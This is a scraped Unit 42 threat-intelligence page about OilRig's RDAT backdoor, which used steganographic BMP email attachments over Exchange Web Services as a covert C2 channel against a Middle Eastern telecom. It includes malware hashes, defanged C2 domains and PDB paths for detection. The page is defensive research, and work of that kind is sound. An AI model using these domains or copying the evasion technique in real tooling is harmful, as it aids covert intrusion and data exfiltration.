2020 against a telecommunications organization. Over the course of three years, this tool has received continued development efforts that have resulted in multiple variations with differences in functionality and available C2 channels. The majority of samples used some combination of HTTP and DNS tunneling channels, with the single exception where we discovered the developer leveraging Exchange Web Services to send and receive emails to and from the actor using steganographic image file attachments. The use of a novel C2 channel in combination with steganography shows the continued evolution and development of different tactics and techniques by this adversary over time.\r\n\r\nPalo Alto Networks customers are protected in the following ways:\r\n\r\n \tAll RDAT samples have malicious verdicts in WildFire and have protections in place through Cortex XDR.\r\n \tDNS tunneling protocols used for C2 communications are blocked via DNS Security.\r\n \tAll C2 domains are classified as Command-and-Control for URL Filtering.\r\n \tAutoFocus customers can monitor activity via the rdat_backdoor tag.\r\n\r\nAppendix\r\nFiles Associated with Attack on Telecommunications Organization\r\n4ea6da6b35c4cdc6043c3b93bd6b61ea225fd5e1ec072330cb746104d0b0a4ec - RDAT backdoor\r\n\r\ne53cc5e62ba15e43877ca2fc1bee16061b4468545d5cc1515cb38000e22dd060 - Custom Mimikatz\r\n\r\n476b40796be68a5ee349677274e438aeda3817f99ba9832172d81a2c64b0d4ae - Bitvise client\r\n\r\n78584dadde1489a5dca0e307318b3d2d49e39eb3987de52e288f9882527078d5 - PowerShell downloader\r\nRDAT Samples\r\n7395a3ada245df6c8ff1d66fcb54b96ae12961d5fd9b6a57c43a3e7ab83f3cc2\r\n\r\n8f943bc5b20517fea08b2d0acc9afe8990703e9d4f7015b98489703ca51da7eb\r\n\r\n8120849fbe85179a16882dd1a12a09fdd3ff97e30c3dfe52b43dd2ba7ed33c2a\r\n\r\nbcdb63b3520e34992f292bf9a38498f49a9ca045b7b40caab5302c76ca10f035\r\n\r\nf42c2b40574dc837b33c1012f7b6f41fcccc5ebf740a2b0af64e2c530418e9e0\r\n\r\nfcabb86331cd5e2fa9edb53c4282dfcb16cc3d2cae85aabf1ee3c0c0007e508c\r\n\r\n7b5042d3f0e9f077ef2b1a55b5fffab9f07cc856622bf79d56fc752e4dc04b28\r\n\r\nee32bde60d1175709fde6869daf9c63cd3227155e37f06d45a27a2f45818a3dc\r\n\r\nde3f1cc2d4aac54fbdebd5bd05c9df59b938eb79bda427ae26dedef4309c55a9\r\n\r\n4ea6da6b35c4cdc6043c3b93bd6b61ea225fd5e1ec072330cb746104d0b0a4ec\r\n\r\nacb50b02ab0ca846025e7ad6c795a80dc6f61c4426704d0f1dd7e195143f5323\r\n\r\n55282007716b2b987a84a790eb1c9867e23ed8b5b89ef1a836cbedaf32982358\r\n\r\nba380e589261781898b1a54c2889f3360db09c61b9155607d7b4d11fcd85bd9d\r\n\r\n6322cacf839b9c863f09c8ad9fd0e091501c9ba354730ab4809bb4c076610006\r\nRDAT C2 Domains\r\nrdmsi[.]com\r\n\r\nrsshay[.]com\r\n\r\nsharjatv[.]com\r\n\r\nwwmal[.]com\r\n\r\nallsecpackupdater[.]com\r\n\r\ntacsent[.]com\r\n\r\nacrlee[.]com \r\n\r\nkopilkaorukov[.]com\r\nRelated Infrastructure\r\ndigi.shanx[.]icu\r\n\r\ntprs-servers[.]eu\r\n\r\noudax[.]com\r\n\r\nkizlarsoroyur[.]com\r\n\r\nintelligent-finance[.]site\r\n\r\n&nbsp;","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2020\/07\/Espionage-r3d2.png","width":150,"height":75},"author":[{"@type":"Person","name":"Robert Falcone"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.2.4' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='application/json' id="wpp-json">
{"sampling_active":0,"sampling_rate":100,"ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":108014,"token":"ca80e59221","lang":0,"debug":0}
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp.min.js?ver=5.2.4'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.4.3'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=108014' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Foilrig-novel-c2-channel-steganography%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Foilrig-novel-c2-channel-steganography%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.4.3 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>

  <body class="post-template-default single single-post postid-108014 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                  <a href="https://www.paloaltonetworks.com/">
<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/">
            <!--<img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" />-->
            <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/images/svg/unit42-logo-white.svg" class="attachment-full size-full" alt="Unit42 Logo"  width="150" height="35"/>
        </a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>


  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">OilRig Targets Middle Eastern Telecommunications Organization and Adds Novel C2 Channel with Steganography to Its Inventory</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-108014 entry-meta">
				
				
				<span class="post-views-count">30,189</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'108014','like')"><i class="ui ui-2"></i><span class="ml-5">16</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 18</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Foilrig-novel-c2-channel-steganography%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/share?text=OilRig+Targets+Middle+Eastern+Telecommunications+Organization+and+Adds+Novel+C2+Channel+with+Steganography+to+Its+Inventory&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Foilrig-novel-c2-channel-steganography%2F" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Foilrig-novel-c2-channel-steganography%2F&title=OilRig+Targets+Middle+Eastern+Telecommunications+Organization+and+Adds+Novel+C2+Channel+with+Steganography+to+Its+Inventory&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>
    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/robertfalcone/" title="Posts by Robert Falcone" class="author url fn" rel="author">Robert Falcone</a>        </p>
        <p><time datetime="2020-07-22T13:00:40+00:00">July 22, 2020 at 6:00 AM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/unit-42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/autofocus/" rel="tag">AutoFocus</a>, <a href="https://unit42.paloaltonetworks.com/tag/cortex/" rel="tag">Cortex</a>, <a href="https://unit42.paloaltonetworks.com/tag/dns-tunneling/" rel="tag">dns tunneling</a>, <a href="https://unit42.paloaltonetworks.com/tag/emea/" rel="tag">EMEA</a>, <a href="https://unit42.paloaltonetworks.com/tag/malware/" rel="tag">malware</a>, <a href="https://unit42.paloaltonetworks.com/tag/mimikatz/" rel="tag">Mimikatz</a>, <a href="https://unit42.paloaltonetworks.com/tag/oilrig/" rel="tag">OilRig</a>, <a href="https://unit42.paloaltonetworks.com/tag/steganography/" rel="tag">steganography</a>, <a href="https://unit42.paloaltonetworks.com/tag/wildfire/" rel="tag">WildFire</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                      <figure class="mb-30 text-center">
              <img width="900" height="450" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/07/Espionage-r3d2.png" class="attachment-single size-single" alt="A conceptual illustration showing a world map along with icons representing malware and other tools used by malicious actors" />            </figure>
                    <p class="wpml-ls-statics-post_translations wpml-ls">This post is also available in: 
    <span class="wpml-ls-slot-post_translations wpml-ls-item wpml-ls-item-ja wpml-ls-first-item wpml-ls-last-item wpml-ls-item-legacy-post-translations"><a href="https://unit42.paloaltonetworks.jp/oilrig-novel-c2-channel-steganography/" class="wpml-ls-link"><span class="wpml-ls-native" lang="ja">日本語</span><span class="wpml-ls-display"><span class="wpml-ls-bracket"> (</span>Japanese<span class="wpml-ls-bracket">)</span></span></a></span></p><p><img class="alignnone size-full wp-image-108018" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/07/word-image-30.png" alt="This screenshot shows an example of malicious behavior from a novel email-based C2 channel that relied on steganography to hide commands and data within bitmap images attached to emails. " width="2500" height="595" /></p>
<h2><a id="post-108014-_2ehh6pfveylw"></a><strong>Executive Summary</strong></h2>
<p>While analyzing an attack against a Middle Eastern telecommunications organization, we discovered a variant of an OilRig-associated tool we call RDAT using a novel email-based command and control (C2) channel that relied on a technique known as steganography to hide commands and data within bitmap images attached to emails.</p>
<p>In May 2020, <a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/greenbug-espionage-telco-south-asia">Symantec published research</a> on the Greenbug group targeting telecommunications organizations in Southeast Asia, involving attacks made as recently as April 2020. We observed similar tactics and tools associated with attacks on a telecommunications organization in the Middle East in April 2020, specifically using custom Mimikatz tools, Bitvise, PowerShell downloaders and a custom backdoor we track as RDAT. Unit 42 has <a href="https://unit42.paloaltonetworks.com/unit42-oilrig-uses-ismdoor-variant-possibly-linked-greenbug-threat-group/">previously linked Greenbug</a> to OilRig, a threat group we discovered in 2015. We had first seen the RDAT tool used in OilRig's operations back in 2017, but we later found a related sample created in 2018 that used a different command and control channel. When we analyzed this sample, we found a novel email-based C2 channel used in combination with steganography to exfiltrate data.</p>
<p>We have been tracking RDAT since 2017, when we first saw this tool uploaded to a webshell related to the TwoFace webshell discussed in our <a href="https://unit42.paloaltonetworks.com/unit42-striking-oil-closer-look-adversary-infrastructure/">Striking Oil blog</a> published on September 26, 2017. RDAT has been under active development since 2017, resulting in multiple variations of the tool that rely on both HTTP and DNS tunneling for C2 communications. In June 2018, the developer of RDAT added the ability to use Exchange Web Services (EWS) to send and receive emails for C2 communications. This email-based C2 channel is novel in its design, as it relies on steganography to hide commands and exfiltrates data within BMP images attached to the emails. The combination of using emails with steganographic images to carry the data across the C2 can result in this activity being much more difficult to detect and allow for higher chances of defense evasion.</p>
<p>Palo Alto Networks customers are protected by WildFire and Cortex XDR, which identifies all RDAT samples as malicious, as well as DNS Security and URL Filtering, which identifies and blocks the C2 activity.</p>
<h2><a id="post-108014-_6zda93mnq9uq"></a><strong>Attack Details</strong></h2>
<p>We first discovered the existence of RDAT on October 7, 2017, when we observed it being uploaded to a webshell 11 days after we had published our research <a href="https://unit42.paloaltonetworks.com/unit42-striking-oil-closer-look-adversary-infrastructure/">exposing webshell activity by this adversary</a>. We believe the group attempted to use the RDAT payload for continued access to the server once the use of the webshell was exposed.</p>
<p>In April 2020, we observed activity involving the potential breach of a telecommunications organization in the Middle East. The files associated with this activity included custom Mimikatz samples for dumping credentials, a sample of the Bitvise client we believe was used to create SSH tunnels, and a custom backdoor called RDAT. From the initial RDAT sample we collected, we were able to expand the sample set and relate previously seen ISMDOOR samples as well. Given the combination of the use of RDAT in OilRig-related webshells, code similarities and tactical similarities, we are confident RDAT is a tool deployed by OilRig.</p>
<p>Two of the related tools collected had PDB paths similar to ones we had seen in the past. The PDB paths were <span style="font-family: 'courier new', courier, monospace;">C:\Users\Void\Desktop\dns\client\x64\Release\client.pdb</span> and <span style="font-family: 'courier new', courier, monospace;">C:\Users\Void\Desktop\RDAT\client\x64\Release\client.pdb</span>, the latter of which is the basis of the tool name. Using the file path of the user in the PDB string of <span style="font-family: 'courier new', courier, monospace;">C:\Users\Void\Desktop</span> as shown in Figure 1, we gathered over a dozen samples with that file path, with most of the samples identified as a known OilRig tool called ISMDOOR. Considering the small cluster of related tools, it is highly likely these have been developed by a single adversary or adversary group with control over the codebase.</p>
<p><img class="aligncenter wp-image-108020" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/07/word-image-31.png" alt="Pivots from PDB strings" width="1749" height="1131" /></p>
<p style="text-align: center;"><em>Figure 1. Pivots from PDB strings</em></p>
<p>We also observed PowerShell downloaders attempting to retrieve files from the domain <span style="font-family: 'courier new', courier, monospace;">digi.shanx[.]icu</span>.</p>
<p><img class="aligncenter wp-image-108022" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/07/word-image-32.png" alt="PowerShell and infrastructure overlaps" width="1534" height="526" /></p>
<p style="text-align: center;"><em>Figure 2. PowerShell and infrastructure overlaps</em></p>
